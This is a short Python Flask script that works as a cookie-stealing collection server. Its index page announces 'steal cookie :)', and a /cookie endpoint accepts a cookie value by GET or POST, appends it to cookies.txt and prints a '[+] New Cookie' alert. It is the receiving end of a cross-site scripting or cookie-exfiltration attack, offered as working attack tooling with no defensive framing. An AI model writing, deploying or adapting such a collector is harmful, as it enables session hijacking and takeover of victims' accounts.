from flask import Flask,request
from termcolor import colored
app = Flask(__name__)
@app.route('/')
def index():
	return 'steal cookie :) '
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == "GET" or request.method == "POST":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
